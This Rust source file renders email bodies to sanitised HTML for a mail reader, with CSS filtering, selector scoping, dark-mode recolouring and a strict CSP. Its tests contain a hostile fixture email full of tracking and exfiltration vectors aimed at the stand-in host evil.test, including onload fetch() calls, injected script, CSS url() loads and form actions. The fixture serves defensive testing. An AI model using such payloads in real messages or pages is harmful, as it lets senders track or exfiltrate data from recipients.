//! Message body to safe HTML for the reader's web view.
//!
//! ammonia removes scripts, handlers, forms, frames and unknown schemes.
//! `<style>` blocks are cut out first, filtered by `filter_css`, and put back
//! after ammonia runs, because ammonia drops them. Remote images become
//! `x-remote:` URLs that the app resolves only when the user allows them. The
//! document carries a CSP that blocks every load except `cid:`, `data:` and
//! `x-remote:` images, as a second layer behind the sanitizer.

use std::borrow::Cow;
use std::collections::HashSet;

use mail_parser::{MessageParser, PartKind};

pub const REMOTE_SCHEME: &str = "x-remote";

const CSP: &str = "default-src 'none'; img-src cid: data: x-remote:; style-src 'unsafe-inline'; font-src data:; form-action 'none'; base-uri 'none'";

#[derive(Clone, Debug, Default)]
pub struct Rendered {
    /// A full HTML document.
    pub html: String,
    /// Number of remote images that are blocked until the user allows them.
    pub remote_images: u32,
    /// The same count per message, in the order they were given.
    pub remote_by_message: Vec<u32>,
}

#[derive(Clone, Debug)]
pub struct Attachment {
    pub index: u32,
    pub name: String,
    pub mime_type: String,
    pub size: u64,
    pub content_id: Option<String>,
}

/// The message's HTML body, or its text body converted to HTML.
fn body_html(raw: &[u8]) -> String {
    let Some(msg) = MessageParser::new().parse(raw) else {
        return text_to_html(&String::from_utf8_lossy(raw));
    };
    let root = msg.root();
    if let Some(part) = root.html_body().next() {
        if matches!(part.kind(), PartKind::Html) {
            if let Some(html) = part.text() {
                return html.into_owned();
            }
        }
    }
    root.body_text(0).map(|t| text_to_html(&t)).unwrap_or_default()
}

pub fn text_to_html(text: &str) -> String {
    let mut out = String::from("<div class=\"kite-plain\">");
    for line in text.lines() {
        let quoted = line.starts_with('>');
        if quoted {
            out.push_str("<span class=\"kite-quote\">");
        }
        out.push_str(&ammonia::clean_text(line));
        if quoted {
            out.push_str("</span>");
        }
        out.push_str("<br>");
    }
    out.push_str("</div>");
    out
}

/// Name, MIME type and decoded bytes of attachment `index`.
pub fn attachment_bytes(raw: &[u8], index: usize) -> Option<(String, String, Vec<u8>)> {
    let msg = MessageParser::new().parse(raw)?;
    let part = msg.root().attachments().nth(index)?;
    let mime = part
        .content_type()
        .map(|c| format!("{}/{}", c.ctype(), c.subtype().unwrap_or("octet-stream")))
        .unwrap_or_else(|| "application/octet-stream".into());
    Some((part.attachment_name().unwrap_or("attachment").to_string(), mime, part.decoded().into_owned()))
}

/// MIME type and bytes of the part a `cid:` URL names, for inline images.
pub fn inline_part(raw: &[u8], content_id: &str) -> Option<(String, Vec<u8>)> {
    let wanted = content_id.trim().trim_matches(['<', '>']);
    let index = attachments(raw).into_iter().find(|a| a.content_id.as_deref().is_some_and(|c| c.eq_ignore_ascii_case(wanted)))?.index;
    attachment_bytes(raw, index as usize).map(|(_, mime, bytes)| (mime, bytes))
}

pub fn attachments(raw: &[u8]) -> Vec<Attachment> {
    let Some(msg) = MessageParser::new().parse(raw) else { return Vec::new() };
    msg.root()
        .attachments()
        .enumerate()
        .map(|(i, a)| {
            let ct = a.content_type();
            Attachment {
                index: i as u32,
                name: a.attachment_name().unwrap_or("attachment").to_string(),
                mime_type: ct
                    .map(|c| format!("{}/{}", c.ctype(), c.subtype().unwrap_or("octet-stream")))
                    .unwrap_or_else(|| "application/octet-stream".into()),
                size: a.decoded_len() as u64,
                content_id: a.headers().iter().find(|h| h.raw_name().eq_ignore_ascii_case("Content-ID")).map(|h| {
                    String::from_utf8_lossy(h.raw_value()).trim().trim_matches(['<', '>']).to_string()
                }),
            }
        })
        .collect()
}

/// Cuts every `<style>...</style>` block out of the HTML and returns both.
fn extract_styles(html: &str) -> (String, Vec<String>) {
    let lower = html.to_ascii_lowercase();
    let mut rest = String::with_capacity(html.len());
    let mut styles = Vec::new();
    let mut pos = 0;
    while let Some(start) = lower[pos..].find("<style").map(|i| i + pos) {
        let Some(open_end) = lower[start..].find('>').map(|i| i + start + 1) else { break };
        let close = lower[open_end..].find("</style").map(|i| i + open_end).unwrap_or(html.len());
        rest.push_str(&html[pos..start]);
        styles.push(html[open_end..close].to_string());
        pos = lower[close..].find('>').map(|i| i + close + 1).unwrap_or(html.len());
    }
    rest.push_str(&html[pos..]);
    (rest, styles)
}

fn strip_css_comments(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut rest = css;
    while let Some(i) = rest.find("/*") {
        out.push_str(&rest[..i]);
        rest = match rest[i + 2..].find("*/") {
            Some(j) => &rest[i + 2 + j + 2..],
            None => "",
        };
    }
    out.push_str(rest);
    out
}

/// Keeps a declaration list (`a: b; c: d`) minus anything that can load or
/// run something: remote `url()`, `expression()`, bindings, `@import`.
pub fn filter_declarations(decls: &str) -> String {
    decls
        .split(';')
        .filter(|d| {
            let lower = d.to_ascii_lowercase().replace(['\\', ' ', '\t', '\n', '\r'], "");
            if lower.trim().is_empty()
                || lower.contains("expression(")
                || lower.contains("-moz-binding")
                || lower.contains("behavior:")
                || lower.contains("@import")
                || lower.contains("javascript:")
            {
                return false;
            }
            let mut rest = lower.as_str();
            while let Some(i) = rest.find("url(") {
                let arg = rest[i + 4..].trim_start_matches(['"', '\'']);
                if !(arg.starts_with("cid:") || arg.starts_with("data:image/")) {
                    return false;
                }
                rest = &rest[i + 4..];
            }
            true
        })
        .map(|d| adapt_color(d.trim()))
        .collect::<Vec<_>>()
        .join("; ")
}

/// Mail is written for a white page. In dark mode the reader recolors it
/// the way Outlook does: a dark `color` gets lighter and a light background
/// gets darker, each as `light-dark(original, adapted)` so light mode keeps
/// the original. Images keep their colors.
fn adapt_color(decl: &str) -> String {
    let Some((prop, value)) = decl.split_once(':') else { return decl.to_string() };
    let prop = prop.trim().to_ascii_lowercase();
    let (value, important) = match value.trim().strip_suffix("!important") {
        Some(v) => (v.trim(), " !important"),
        None => (value.trim(), ""),
    };
    let adapted = match prop.as_str() {
        "color" => parse_color(value).and_then(dark_text),
        "background-color" | "background" => parse_color(value).and_then(dark_background),
        _ => None,
    };
    match adapted {
        Some((r, g, b)) => format!("{prop}: light-dark({value}, rgb({r} {g} {b})){important}"),
        None => decl.to_string(),
    }
}

/// Dark text, mirrored to a light shade of the same hue.
fn dark_text((r, g, b): (u8, u8, u8)) -> Option<(u8, u8, u8)> {
    (luminance(r, g, b) < 0.4).then(|| with_lightness((r, g, b), |l| (1.0 - l).clamp(0.78, 0.92)))
}

/// A light background, mirrored to a dark shade. White lands on the reader's
/// own background and lighter greys stay a step apart, so a white card on a
/// grey page is still a card.
fn dark_background((r, g, b): (u8, u8, u8)) -> Option<(u8, u8, u8)> {
    (luminance(r, g, b) > 0.45).then(|| with_lightness((r, g, b), |l| (0.09 + (1.0 - l)).clamp(0.09, 0.3)))
}

type Adapt = fn((u8, u8, u8)) -> Option<(u8, u8, u8)>;

/// `bgcolor` and `<font color>` are attributes, which can't hold
/// `light-dark()`; dark mode gets a rule per value, scoped to the message.
fn dark_attribute_rules(html: &str, scope: &str) -> String {
    let mut rules = String::new();
    let mut seen = HashSet::new();
    let attrs: [(&str, &str, &str, Adapt); 2] =
        [("bgcolor", "", "background-color", dark_background), ("color", "font", "color", dark_text)];
    for (name, element, property, adapt) in attrs {
        let needle = format!(" {name}=\"");
        let mut rest = html;
        while let Some(i) = rest.find(&needle) {
            rest = &rest[i + needle.len()..];
            let Some(end) = rest.find('"') else { break };
            let value = &rest[..end];
            if !value.chars().all(|c| c.is_ascii_alphanumeric() || c == '#') || !seen.insert((name, value.to_ascii_lowercase())) {
                continue;
            }
            if let Some((r, g, b)) = parse_color(value).and_then(adapt) {
                rules.push_str(&format!("{scope} {element}[{name}=\"{value}\" i]{{{property}: rgb({r} {g} {b})}}\n"));
            }
        }
    }
    if rules.is_empty() { rules } else { format!("@media (prefers-color-scheme: dark){{\n{rules}}}\n") }
}

/// CSS named colors, plus the system colors Outlook and Word write.
const NAMED_COLORS: &[(&str, u32)] = &[
    ("aliceblue", 0xf0f8ff), ("antiquewhite", 0xfaebd7), ("aqua", 0x00ffff), ("aquamarine", 0x7fffd4),
    ("azure", 0xf0ffff), ("beige", 0xf5f5dc), ("bisque", 0xffe4c4), ("black", 0x000000),
    ("blanchedalmond", 0xffebcd), ("blue", 0x0000ff), ("blueviolet", 0x8a2be2), ("brown", 0xa52a2a),
    ("burlywood", 0xdeb887), ("cadetblue", 0x5f9ea0), ("chartreuse", 0x7fff00), ("chocolate", 0xd2691e),
    ("coral", 0xff7f50), ("cornflowerblue", 0x6495ed), ("cornsilk", 0xfff8dc), ("crimson", 0xdc143c),
    ("cyan", 0x00ffff), ("darkblue", 0x00008b), ("darkcyan", 0x008b8b), ("darkgoldenrod", 0xb8860b),
    ("darkgray", 0xa9a9a9), ("darkgreen", 0x006400), ("darkgrey", 0xa9a9a9), ("darkkhaki", 0xbdb76b),
    ("darkmagenta", 0x8b008b), ("darkolivegreen", 0x556b2f), ("darkorange", 0xff8c00), ("darkorchid", 0x9932cc),
    ("darkred", 0x8b0000), ("darksalmon", 0xe9967a), ("darkseagreen", 0x8fbc8f), ("darkslateblue", 0x483d8b),
    ("darkslategray", 0x2f4f4f), ("darkslategrey", 0x2f4f4f), ("darkturquoise", 0x00ced1), ("darkviolet", 0x9400d3),
    ("deeppink", 0xff1493), ("deepskyblue", 0x00bfff), ("dimgray", 0x696969), ("dimgrey", 0x696969),
    ("dodgerblue", 0x1e90ff), ("firebrick", 0xb22222), ("floralwhite", 0xfffaf0), ("forestgreen", 0x228b22),
    ("fuchsia", 0xff00ff), ("gainsboro", 0xdcdcdc), ("ghostwhite", 0xf8f8ff), ("gold", 0xffd700),
    ("goldenrod", 0xdaa520), ("gray", 0x808080), ("green", 0x008000), ("greenyellow", 0xadff2f), ("grey", 0x808080),
    ("honeydew", 0xf0fff0), ("hotpink", 0xff69b4), ("indianred", 0xcd5c5c), ("indigo", 0x4b0082),
    ("ivory", 0xfffff0), ("khaki", 0xf0e68c), ("lavender", 0xe6e6fa), ("lavenderblush", 0xfff0f5),
    ("lawngreen", 0x7cfc00), ("lemonchiffon", 0xfffacd), ("lightblue", 0xadd8e6), ("lightcoral", 0xf08080),
    ("lightcyan", 0xe0ffff), ("lightgoldenrodyellow", 0xfafad2), ("lightgray", 0xd3d3d3), ("lightgreen", 0x90ee90),
    ("lightgrey", 0xd3d3d3), ("lightpink", 0xffb6c1), ("lightsalmon", 0xffa07a), ("lightseagreen", 0x20b2aa),
    ("lightskyblue", 0x87cefa), ("lightslategray", 0x778899), ("lightslategrey", 0x778899),
    ("lightsteelblue", 0xb0c4de), ("lightyellow", 0xffffe0), ("lime", 0x00ff00), ("limegreen", 0x32cd32),
    ("linen", 0xfaf0e6), ("magenta", 0xff00ff), ("maroon", 0x800000), ("mediumaquamarine", 0x66cdaa),
    ("mediumblue", 0x0000cd), ("mediumorchid", 0xba55d3), ("mediumpurple", 0x9370db), ("mediumseagreen", 0x3cb371),
    ("mediumslateblue", 0x7b68ee), ("mediumspringgreen", 0x00fa9a), ("mediumturquoise", 0x48d1cc),
    ("mediumvioletred", 0xc71585), ("midnightblue", 0x191970), ("mintcream", 0xf5fffa), ("mistyrose", 0xffe4e1),
    ("moccasin", 0xffe4b5), ("navajowhite", 0xffdead), ("navy", 0x000080), ("oldlace", 0xfdf5e6),
    ("olive", 0x808000), ("olivedrab", 0x6b8e23), ("orange", 0xffa500), ("orangered", 0xff4500),
    ("orchid", 0xda70d6), ("palegoldenrod", 0xeee8aa), ("palegreen", 0x98fb98), ("paleturquoise", 0xafeeee),
    ("palevioletred", 0xdb7093), ("papayawhip", 0xffefd5), ("peachpuff", 0xffdab9), ("peru", 0xcd853f),
    ("pink", 0xffc0cb), ("plum", 0xdda0dd), ("powderblue", 0xb0e0e6), ("purple", 0x800080),
    ("rebeccapurple", 0x663399), ("red", 0xff0000), ("rosybrown", 0xbc8f8f), ("royalblue", 0x4169e1),
    ("saddlebrown", 0x8b4513), ("salmon", 0xfa8072), ("sandybrown", 0xf4a460), ("seagreen", 0x2e8b57),
    ("seashell", 0xfff5ee), ("sienna", 0xa0522d), ("silver", 0xc0c0c0), ("skyblue", 0x87ceeb),
    ("slateblue", 0x6a5acd), ("slategray", 0x708090), ("slategrey", 0x708090), ("snow", 0xfffafa),
    ("springgreen", 0x00ff7f), ("steelblue", 0x4682b4), ("tan", 0xd2b48c), ("teal", 0x008080), ("thistle", 0xd8bfd8),
    ("tomato", 0xff6347), ("turquoise", 0x40e0d0), ("violet", 0xee82ee), ("wheat", 0xf5deb3), ("white", 0xffffff),
    ("whitesmoke", 0xf5f5f5), ("yellow", 0xffff00), ("yellowgreen", 0x9acd32), ("window", 0xffffff),
    ("windowtext", 0x000000), ("buttontext", 0x000000), ("buttonface", 0xf0f0f0), ("canvas", 0xffffff),
    ("canvastext", 0x000000),
];

fn parse_color(value: &str) -> Option<(u8, u8, u8)> {
    let v = value.trim().to_ascii_lowercase();
    if let Some(hex) = v.strip_prefix('#') {
        let digits: Vec<u8> = hex.chars().map(|c| c.to_digit(16).map(|d| d as u8)).collect::<Option<_>>()?;
        return match digits.len() {
            3 | 4 => Some((digits[0] * 17, digits[1] * 17, digits[2] * 17)),
            6 | 8 => Some((digits[0] * 16 + digits[1], digits[2] * 16 + digits[3], digits[4] * 16 + digits[5])),
            _ => None,
        };
    }
    if let Some(args) = v.strip_prefix("rgb(").or_else(|| v.strip_prefix("rgba(")).and_then(|a| a.strip_suffix(')')) {
        let n: Vec<u8> = args
            .split([',', ' ', '/'])
            .filter(|p| !p.is_empty())
            .take(3)
            .map(|p| p.parse::<f32>().ok().map(|f| f.clamp(0.0, 255.0) as u8))
            .collect::<Option<_>>()?;
        return (n.len() == 3).then(|| (n[0], n[1], n[2]));
    }
    let rgb = NAMED_COLORS.iter().find(|(name, _)| *name == v)?.1;
    Some(((rgb >> 16) as u8, (rgb >> 8) as u8, rgb as u8))
}

fn luminance(r: u8, g: u8, b: u8) -> f32 {
    let lin = |c: u8| {
        let c = c as f32 / 255.0;
        if c <= 0.04045 { c / 12.92 } else { ((c + 0.055) / 1.055).powf(2.4) }
    };
    0.2126 * lin(r) + 0.7152 * lin(g) + 0.0722 * lin(b)
}

/// The same hue and saturation at the lightness `f` picks from the old one.
fn with_lightness((r, g, b): (u8, u8, u8), f: impl Fn(f32) -> f32) -> (u8, u8, u8) {
    let (r, g, b) = (r as f32 / 255.0, g as f32 / 255.0, b as f32 / 255.0);
    let (max, min) = (r.max(g).max(b), r.min(g).min(b));
    let l = (max + min) / 2.0;
    let d = max - min;
    let s = if d == 0.0 { 0.0 } else { d / (1.0 - (2.0 * l - 1.0).abs()) };
    let h = if d == 0.0 {
        0.0
    } else if max == r {
        60.0 * (((g - b) / d).rem_euclid(6.0))
    } else if max == g {
        60.0 * ((b - r) / d + 2.0)
    } else {
        60.0 * ((r - g) / d + 4.0)
    };
    let l = f(l);
    let c = (1.0 - (2.0 * l - 1.0).abs()) * s;
    let x = c * (1.0 - ((h / 60.0).rem_euclid(2.0) - 1.0).abs());
    let (r1, g1, b1) = match h as u32 / 60 {
        0 => (c, x, 0.0),
        1 => (x, c, 0.0),
        2 => (0.0, c, x),
        3 => (0.0, x, c),
        4 => (x, 0.0, c),
        _ => (c, 0.0, x),
    };
    let m = l - c / 2.0;
    let to = |v: f32| ((v + m) * 255.0).round().clamp(0.0, 255.0) as u8;
    (to(r1), to(g1), to(b1))
}

/// Table-built mail (newsletters, receipts) has a layout of its own: the
/// reader centers it at its own width instead of the reading measure.
fn has_layout(html: &str) -> bool {
    html.contains("<table")
}

/// Filters a stylesheet: rules with attribute selectors and at-rules other
/// than `@media` and `@supports` are dropped; declarations go through
/// `filter_declarations`. Every selector is scoped under `scope` (a selector
/// such as `#m42`), with `html` and `body` mapped to the scope itself, so one
/// message's styles never reach another message in the same document.
pub fn filter_css(css: &str, scope: &str) -> String {
    let css = strip_css_comments(css);
    let mut out = String::new();
    let mut rest = css.as_str();
    loop {
        rest = rest.trim_start();
        if rest.is_empty() {
            break;
        }
        let Some(open) = rest.find('{') else { break };
        let head = rest[..open].trim();
        if let Some(semi) = head.find(';') {
            // A statement at-rule such as `@import url(...);` before this block.
            rest = &rest[semi + 1..];
            continue;
        }
        let Some(close) = matching_brace(rest, open) else { break };
        let body = &rest[open + 1..close];
        rest = &rest[close + 1..];

        let head_lower = head.to_ascii_lowercase();
        if head_lower.starts_with("@media") || head_lower.starts_with("@supports") {
            let inner = filter_css(body, scope);
            if !inner.is_empty() {
                out.push_str(&format!("{head}{{{inner}}}\n"));
            }
        } else if head.starts_with('@') || head.contains('[') || head.contains('\\') {
            continue;
        } else {
            let selectors = scope_selectors(head, scope);
            let mut decls = filter_declarations(body);
            if selectors.split(", ").any(|sel| sel == scope) {
                decls = without_layout(&decls);
            }
            if !decls.is_empty() {
                out.push_str(&format!("{selectors}{{{decls}}}\n"));
            }
        }
    }
    out.replace("</", "<\\/")
}

/// The message's `html` and `body` rules land on the reader's own message
/// box, which sizes and centers the message; they keep colors and fonts but
/// not widths, heights, margins or padding (a `min-width: 750px` there
/// forced sideways scrolling).
fn without_layout(decls: &str) -> String {
    decls
        .split("; ")
        .filter(|d| {
            let prop = d.split(':').next().unwrap_or("").trim().to_ascii_lowercase();
            !["width", "min-width", "max-width", "height", "min-height", "max-height", "margin", "padding"]
                .iter()
                .any(|p| prop == *p || prop.starts_with(&format!("{p}-")))
        })
        .collect::<Vec<_>>()
        .join("; ")
}

fn scope_selectors(head: &str, scope: &str) -> String {
    head.split(',')
        .map(|sel| {
            let sel = sel.trim();
            let lower = sel.to_ascii_lowercase();
            for root in ["html body", "html", "body", ":root"] {
                if lower == root {
                    return scope.to_string();
                }
                if lower.starts_with(root) && lower[root.len()..].starts_with([' ', '>', '.', '#', ':']) {
                    return format!("{scope}{}", &sel[root.len()..]);
                }
            }
            format!("{scope} {sel}")
        })
        .collect::<Vec<_>>()
        .join(", ")
}

fn matching_brace(s: &str, open: usize) -> Option<usize> {
    let mut depth = 0;
    for (i, c) in s[open..].char_indices() {
        match c {
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(open + i);
                }
            }
            _ => {}
        }
    }
    None
}

fn sanitizer() -> ammonia::Builder<'static> {
    let mut b = ammonia::Builder::default();
    b.add_tags(["font", "center", "span", "div", "table", "tbody", "thead", "tfoot", "tr", "td", "th", "caption", "col", "colgroup", "u", "s", "strike"])
        .rm_tags(["img"])
        .add_tags(["img"])
        .add_generic_attributes(["style", "class", "align", "valign", "bgcolor", "width", "height", "dir", "lang", "title"])
        .add_tag_attributes("img", ["src", "alt", "width", "height", "border"])
        .add_tag_attributes("table", ["border", "cellpadding", "cellspacing", "background"])
        .add_tag_attributes("td", ["colspan", "rowspan", "nowrap", "background"])
        .add_tag_attributes("th", ["colspan", "rowspan", "nowrap"])
        .add_tag_attributes("font", ["color", "face", "size"])
        .add_tag_attributes("a", ["href", "name"])
        .url_schemes(HashSet::from(["http", "https", "mailto", "tel", "cid", "data"]))
        .url_relative(ammonia::UrlRelative::Deny)
        .link_rel(Some("noopener noreferrer"))
        .strip_comments(true)
        .attribute_filter(|element, attribute, value| match (element, attribute) {
            (_, "style") => {
                let filtered = filter_declarations(value);
                (!filtered.is_empty()).then_some(Cow::Owned(filtered))
            }
            (_, "background") => None,
            ("img", "src") => {
                let lower = value.trim().to_ascii_lowercase();
                if lower.starts_with("cid:") || lower.starts_with("data:image/") {
                    Some(Cow::Borrowed(value))
                } else if lower.starts_with("http://") || lower.starts_with("https://") {
                    Some(Cow::Owned(format!("{REMOTE_SCHEME}:{}", value.trim())))
                } else {
                    None
                }
            }
            ("a", "href") if value.trim().to_ascii_lowercase().starts_with("data:") => None,
            _ => Some(Cow::Borrowed(value)),
        });
    b
}

/// One message of a thread, as the reader shows it.
pub struct MessageView<'a> {
    pub id: i64,
    pub from: &'a str,
    pub to: &'a str,
    pub date: &'a str,
    pub snippet: &'a str,
    pub raw: &'a [u8],
    /// Open messages show their body; others collapse to one line.
    pub open: bool,
    pub vip: bool,
}

fn human_size(bytes: u64) -> String {
    match bytes {
        b if b >= 1 << 20 => format!("{:.1} MB", b as f64 / (1 << 20) as f64),
        b if b >= 1 << 10 => format!("{} KB", b >> 10),
        b => format!("{b} bytes"),
    }
}

fn escape(s: &str) -> String {
    ammonia::clean_text(s)
}

/// Renders a thread into one locked-down HTML document. Each message is a
/// `<details>` element, so collapsing and expanding needs no JavaScript.
/// `app_css` is the app's own stylesheet for the page around the messages.
pub fn render_thread(messages: &[MessageView], app_css: &str) -> Rendered {
    let mut body = String::new();
    let mut css = String::new();
    let mut remote_by_message = Vec::with_capacity(messages.len());
    let clean_builder = sanitizer();
    for m in messages {
        let (html, styles) = extract_styles(&body_html(m.raw));
        let mut clean = clean_builder.clean(&html).to_string().replace("src=\"cid:", &format!("src=\"cid:{}/", m.id));
        let wide = has_layout(&clean);
        // Images the body shows inline aren't attachments to the reader.
        let files: Vec<Attachment> = attachments(m.raw)
            .into_iter()
            .filter(|f| !f.content_id.as_ref().is_some_and(|c| clean.contains(&format!("cid:{}/{c}", m.id))))
            .collect();
        if !files.is_empty() {
            clean.push_str("<div class=\"kite-files\">");
            for f in &files {
                clean.push_str(&format!(
                    "<a class=\"kite-file\" href=\"x-attachment:{}/{}\"><b>{}</b><small>{}</small></a>",
                    m.id,
                    f.index,
                    escape(&f.name),
                    human_size(f.size)
                ));
            }
            clean.push_str("</div>");
        }
        remote_by_message.push(clean.matches(&format!("src=\"{REMOTE_SCHEME}:")).count() as u32);
        let scope = format!("#m{}", m.id);
        for s in &styles {
            css.push_str(&filter_css(s, &scope));
        }
        css.push_str(&dark_attribute_rules(&clean, &scope));
        body.push_str(&format!(
            "<details class=\"kite-message\"{open}><summary><span class=\"kite-from\">{from}</span>{vip}\
             <span class=\"kite-snippet\">{snippet}</span><span class=\"kite-date\">{date}</span>\
             <div class=\"kite-to\">to {to}</div></summary><div class=\"kite-body{layout}\" id=\"m{id}\">{clean}</div></details>",
            open = if m.open { " open" } else { "" },
            from = escape(m.from),
            vip = if m.vip { "<span class=\"kite-vip\">VIP</span>" } else { "" },
            snippet = escape(m.snippet),
            date = escape(m.date),
            to = escape(m.to),
            id = m.id,
            layout = if wide { " kite-wide" } else { "" },
        ));
    }
    let html = format!(
        "<!DOCTYPE html><html><head><meta charset=\"utf-8\">\
         <meta http-equiv=\"Content-Security-Policy\" content=\"{CSP}\">\
         <meta name=\"referrer\" content=\"no-referrer\">\
         <meta name=\"color-scheme\" content=\"light dark\">\
         <style>{}</style><style>{css}</style></head><body>{body}</body></html>",
        app_css.replace("</", "<\\/")
    );
    Rendered { html, remote_images: remote_by_message.iter().sum(), remote_by_message }
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOSTILE: &str = r#"From: a@example.com
Subject: hostile
Content-Type: text/html

<html><head>
<link rel="stylesheet" href="http://evil.test/1.css">
<style>@import url(http://evil.test/2.css); body { background: url('http://evil.test/3.png'); color: red }
@font-face { font-family: x; src: url(http://evil.test/4.woff) }
input[value^="a"] { background: url(http://evil.test/5) }
@media (max-width: 600px) { .x { width: 100%; background-image: url("https://evil.test/6") } }
</style><meta http-equiv="refresh" content="0;url=http://evil.test/7"></head>
<body onload="fetch('http://evil.test/8')">
<img src="http://evil.test/pixel.gif" width=1 height=1>
<img src="cid:logo@x"><img src="data:image/png;base64,AAAA">
<script>new Image().src='http://evil.test/9'</script>
<iframe src="http://evil.test/10"></iframe><object data="http://evil.test/11"></object>
<video src="http://evil.test/12" poster="http://evil.test/13"></video>
<form action="http://evil.test/14"><input name=x></form>
<a href="javascript:alert(1)">js</a> <a href="https://example.com/ok">ok</a>
<div style="background:url(http://evil.test/15); color: blue">styled</div>
<table background="http://evil.test/16"><tr><td background="http://evil.test/17">t</td></tr></table>
<svg><image href="http://evil.test/18"/></svg>
</body></html>
"#;

    #[test]
    fn dark_text_gets_a_dark_mode_color() {
        assert_eq!(filter_declarations("color: #333"), "color: light-dark(#333, rgb(204 204 204))");
        assert_eq!(filter_declarations("color:black !important"), "color: light-dark(black, rgb(235 235 235)) !important");
        assert_eq!(filter_declarations("color: #eeeeee; background-color: #000"), "color: #eeeeee; background-color: #000");
    }

    #[test]
    fn body_rules_keep_colors_but_not_layout() {
        let css = filter_css("body { min-width: 750px; margin: 0 !important; color: #fff; } .x { width: 600px }", "#m1");
        assert!(css.contains("#m1{color: #fff}"), "{css}");
        assert!(css.contains("#m1 .x{width: 600px}"), "{css}");
    }

    #[test]
    fn named_colors_count() {
        assert_eq!(filter_declarations("background:white"), "background: light-dark(white, rgb(23 23 23))");
        assert_eq!(filter_declarations("color:blue"), "color: light-dark(blue, rgb(143 143 255))");
    }

    #[test]
    fn light_backgrounds_turn_dark() {
        assert_eq!(filter_declarations("background-color: #ffffff"), "background-color: light-dark(#ffffff, rgb(23 23 23))");
        assert_eq!(filter_declarations("background:#0a1a33"), "background:#0a1a33", "dark backgrounds stay");
        let rules = dark_attribute_rules(r##"<table bgcolor="#f4f4f4"><tr><td bgcolor="#0a1a33"><font color="#333">x</font>"##, "#m1");
        assert!(rules.contains("#m1 [bgcolor=\"#f4f4f4\" i]{background-color: rgb(34 34 34)}"), "{rules}");
        assert!(!rules.contains("0a1a33"), "{rules}");
        assert!(rules.contains("#m1 font[color=\"#333\" i]{color: rgb(204 204 204)}"), "{rules}");
    }

    #[test]
    fn hostile_message_loads_nothing_remote() {
        let raw = HOSTILE.replace('\n', "\r\n");
        let out = render_thread(&[view(raw.as_bytes())], "body{}");
        let html = out.html;
        for n in 1..=18 {
            let url = format!("evil.test/{n}");
            assert!(!html.contains(&url), "leaked {url}:\n{html}");
        }
        assert!(html.contains("x-remote:http://evil.test/pixel.gif"));
        assert_eq!(out.remote_images, 1);
        assert!(html.contains("src=\"cid:1/logo@x\""), "cid URLs name their message");
        assert!(html.contains("data:image/png"));
        assert!(!html.contains("<script"));
        assert!(!html.contains("javascript:"));
        assert!(!html.contains("onload"));
        assert!(html.contains("href=\"https://example.com/ok\""));
        assert!(html.contains("color: light-dark(blue, "), "inline colors survive, adapted for dark mode");
        assert!(html.contains("#m1{color: light-dark(red, "), "style blocks survive, scoped");
        assert!(html.contains("@media (max-width: 600px){#m1 .x{width: 100%}"));
    }

    #[test]
    fn plain_text_is_escaped() {
        let out = render_thread(&[view(b"Subject: t\r\n\r\n<b>hi</b>\r\n> quoted\r\n")], "");
        assert!(out.html.contains("&lt;b&gt;hi&lt;/b&gt;"));
        assert!(out.html.contains("<span class=\"kite-quote\">&gt; quoted</span>"));
    }

    #[test]
    fn style_cannot_close_its_tag() {
        assert!(!filter_css("a{color:red}</style><script>x</script>", "#m1").contains("</style>"));
    }

    #[test]
    fn scopes_selectors() {
        assert_eq!(scope_selectors("body, p.x, html body .y, .z", "#m7"), "#m7, #m7 p.x, #m7 .y, #m7 .z");
    }

    fn view(raw: &[u8]) -> MessageView<'_> {
        MessageView { id: 1, from: "a", to: "b", date: "today", snippet: "", raw, open: true, vip: false }
    }
}
